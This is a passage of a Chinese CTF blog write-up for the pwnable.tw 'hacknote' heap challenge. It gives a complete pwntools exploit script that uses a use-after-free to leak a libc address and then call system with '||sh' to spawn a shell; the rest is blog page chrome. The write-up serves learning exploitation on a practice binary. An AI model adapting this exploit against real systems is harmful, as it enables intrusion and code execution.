+<p>即函数的调用为：<code>system(&quot;0x000aaabb || sh&quot;)</code>，只有使用<code>||</code>，才会把<code>sh</code>执行了。</p>
+<p>那么思路理清楚了，直接给出hacknote_poc.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># hacknote 是 32 位程序，用 i386</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DIR = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;practices&#x27;</span>, <span class="string">&#x27;pwnable.tw hacknote&#x27;</span>)</span><br><span class="line">elf = ELF(os.path.join(DIR, <span class="string">&#x27;hacknote&#x27;</span>))</span><br><span class="line"><span class="comment"># 用本机 32 位 libc（ldd 显示的 /lib/i386-linux-gnu/libc.so.6）</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地复现：不设 LD_PRELOAD，直接用本机 libc</span></span><br><span class="line">p = process(<span class="string">&#x27;./hacknote&#x27;</span>, cwd=DIR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">b&#x27;16&#x27;</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add_note(<span class="string">b&#x27;16&#x27;</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># checksec发现没有启用PIE，IDA直接查找puts的地址</span></span><br><span class="line">puts_addr = <span class="number">0x0804862B</span></span><br><span class="line">read_got_addr = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>, p32(puts_addr) + p32(read_got_addr))</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取到read的地址</span></span><br><span class="line">read_address = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(read_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc的基地址</span></span><br><span class="line">libc_base = read_address - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="comment"># 获取system的真实地址</span></span><br><span class="line">system_address = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除note2，触发UAF</span></span><br><span class="line">delete_note(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入system的参数值</span></span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>, p32(system_address) + <span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发system函数</span></span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>执行脚本:</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260317172306098.png" alt="image-20260317172306098" loading="lazy" decoding="async"></p>
+<h2 id="参考" tabindex="-1"><a class="headerlink" href="#参考" aria-hidden="true"></a> 参考</h2>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>格式化字符串漏洞 <a href="https://x2nn.github.io/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D">https://x2nn.github.io/2026/01/12/栈迁移和格式化字符串学习/#格式化字符串漏洞介绍</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p>可执行文件几种常见的安全措施 <a href="https://x2nn.github.io/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/#The-NX-bits">https://x2nn.github.io/2025/08/19/二进制之ROP技巧学习/#The-NX-bits</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p>got表 <a href="https://x2nn.github.io/2025/08/30/ELF%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%87%E7%A8%8B/#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84">https://x2nn.github.io/2025/08/30/ELF文件中动态链接库函数的过程/#动态链接过程中相关结构</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/01/25/%E5%A0%86%E4%B8%AD%E7%9A%84bin/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-03-17 17:27:50
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/heap-Overflow/" title="heap Overflow">
+                        #heap Overflow
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/bins/" title="bins">
+                        #bins
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/UAF/" title="UAF">
+                        #UAF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CTF/" title="CTF">
+                        <b>#</b> CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2026/03/08/Kubernetes-K8s-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fmtstr_uaf"><span class="toc-text"> fmtstr_uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text"> 反编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text"> 漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text"> 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2shellcode%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="toc-text"> 泄露shellcode的真实地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%9A%84%E7%AF%A1%E6%94%B9"><span class="toc-text"> 返回地址的篡改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text"> 漏洞触发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacknote"><span class="toc-text"> hacknote</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91-1"><span class="toc-text"> 反编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91"><span class="toc-text"> add函数逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91"><span class="toc-text"> delete函数逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text"> 参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <!-- Giscus 评论区：基于 GitHub Discussions -->
+  <div class="giscus"></div>
+  <script src="https://giscus.app/client.js"
+          data-repo="x2nn/x2nn.github.io"
+          data-repo-id="R_kgDOMV-gkA"
+          data-category="Announcements"
+          data-category-id="DIC_kwDOMV-gkM4C7iiE"
+          data-mapping="pathname"
+          data-strict="0"
+          data-reactions-enabled="1"
+          data-emit-metadata="0"
+          data-input-position="top"
+          data-theme="preferred_color_scheme"
+          data-lang="zh-CN"
+          data-loading="lazy"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+  <!-- 跟随站点 light/dark 动态切换 Giscus 主题 -->
+  <script>
+    (function () {
+      function currentMode() {
+        return document.documentElement.getAttribute('color-mode') === 'dark' ? 'dark' : 'light';
+      }
+      function postTheme() {
+        var frame = document.querySelector('iframe.giscus-frame');
+        if (!frame) return;
+        frame.contentWindow.postMessage(
+          { giscus: { setConfig: { theme: currentMode() } } },
+          'https://giscus.app'
+        );
+      }
+      new MutationObserver(postTheme).observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['color-mode']
+      });
+    })();
+  </script>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2026</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2026%2F02%2F28%2F%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E5%25A0%2586%25E7%259A%2584%25E7%25BB%2583%25E4%25B9%25A0%25E9%25A2%2598%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
